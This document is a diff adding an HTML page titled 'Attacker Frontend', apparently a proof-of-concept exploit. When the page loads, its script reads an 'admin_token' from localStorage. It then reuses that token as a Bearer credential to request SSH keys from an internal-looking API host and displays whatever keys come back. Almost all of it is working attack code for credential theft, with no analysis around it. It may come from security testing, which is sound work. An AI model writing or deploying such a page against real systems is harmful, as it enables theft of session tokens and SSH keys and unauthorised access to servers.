@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Attacker Frontend</title>
+    <style>
+        body {
+            background: #111;
+            color: #ddd;
+            font-family: monospace;
+            padding: 30px;
+        }
+
+        pre {
+            background: #222;
+            padding: 15px;
+            white-space: pre-wrap;
+            border: 1px solid #444;
+        }
+
+        .error {
+            color: #ff6666;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>Attacker-Controlled Frontend</h1>
+    <p>Extracted localStorage token:</p>
+
+    <pre id="token">(waiting...)</pre>
+
+    <p>Retrieved SSH keys:</p>
+
+    <pre id="keys">(waiting...)</pre>
+
+    <script>
+        async function run() {
+            const tokenElement = document.getElementById("token");
+            const keysElement = document.getElementById("keys");
+
+            // Change this key if ssh_keys.html uses a different localStorage key.
+            const token = localStorage.getItem("admin_token");
+
+            if (!token) {
+                tokenElement.textContent = "No token found in localStorage.";
+                return;
+            }
+
+            tokenElement.textContent = token;
+
+            try {
+                const response = await fetch(
+                    "https://sandbox-dev-001.skyblue.com:8090/api/ssh_keys",
+                    {
+                        headers: {
+                            "Authorization": "Bearer " + token
+                        }
+                    }
+                );
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    keysElement.textContent =
+                        "Request failed: " + JSON.stringify(data, null, 2);
+                    return;
+                }
+
+                keysElement.textContent =
+                    JSON.stringify(data, null, 2);
+
+            } catch (error) {
+                keysElement.textContent =
+                    "Request error: " + error;
+            }
+        }
+
+        run();
+    </script>
+
+</body>
+
+</html>
